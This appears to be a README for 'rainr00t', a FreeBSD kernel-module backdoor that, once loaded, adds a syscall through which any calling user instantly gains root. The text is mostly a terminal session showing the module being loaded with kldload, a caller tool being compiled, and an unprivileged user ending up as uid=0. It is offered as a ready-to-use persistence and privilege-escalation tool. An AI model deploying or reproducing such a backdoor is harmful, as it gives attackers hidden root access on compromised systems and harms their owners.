rainr00t
========

instant root-priv backd00r via kernelland anyone? 
well this module, once loaded gives the thread/user calling instantly root, without spawning an extra
shell or alike. 

usage
-----

root@crashb0x:~/gainroot # uname -a
FreeBSD crashb0x 10.1-RELEASE FreeBSD 10.1-RELEASE #0 r274401: Tue Nov 11 21:02:49 UTC 2014     root@releng1.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC  amd64

root@crashb0x:~/gainroot # kldload ./rainroot.ko

root@crashb0x:~/gainroot # kldstat
Id Refs Address            Size     Name
 1    3 0xffffffff80200000 1755658  kernel
 3    1 0xffffffff81a12000 20e      rainroot.ko

# userland tool, to call the newly loaded syscall (normally its syscall 210)
l00ser@crashb0x:/tmp $ gcc48 caller.c -o caller
l00ser@crashb0x:/tmp % ./caller 211
l00ser@crashb0x:/tmp % id
uid=0(root) gid=0(wheel) egid=1001(l00ser) groups=1001(l00ser)

author
------
dash

